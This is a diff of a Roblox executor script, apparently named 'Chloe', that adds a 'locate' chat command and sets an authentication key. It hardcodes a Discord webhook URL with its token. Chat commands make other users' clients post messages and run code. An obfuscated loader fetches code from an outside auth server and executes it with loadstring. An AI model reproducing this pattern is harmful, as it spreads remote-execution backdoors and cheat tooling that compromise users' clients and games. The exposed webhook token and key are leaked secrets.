@@ -1,5 +1,7 @@
 local url = "https://discord.com/api/webhooks/1149165664016281742/35qfxtXfQh5hfIpvKjmjjQWazEzT8KFyksuP22XbKbxTHG07Ggfg5Xni4ykzzbxrh0j5"
 
+print("Chloe Loaded")
+
 local enabled = true
 
 if enabled == true then
@@ -139,6 +141,20 @@ Action[i].Chatted:connect(function(msg, recipient)
                     Duration = 5
                 })
             end
+            if args[2] == "locate" or args[2] == "." then
+                local locateargs = {
+                    [1] = "[!]",
+                    [2] = "All"
+                }
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(locateargs))
+
+                notifLib:CreateDefaultNotif({
+                    TweenSpeed = 0.7,
+                    Title = "[🕹️] Chloe ("..version..")",
+                    Text = "A Chloe User is calling u, go find him",
+                    Duration = 5
+                })
+            end
             if args[2] == "Reload" or args[2] == "reload" then
                 local argsreload = {
                     [1] = "[Chloe] Reloaded Config ./bin [OWNER]",
@@ -223,7 +239,7 @@ Action[i].Chatted:connect(function(msg, recipient)
                     }   
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(argsmm2))
                     wait(2)
-                    getgenv().mainKey = "nil";
+                    getgenv().mainKey = "951a118cc45a67be5f53_ae2dfd4bf9fe237323b2";
 
                     local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
                     
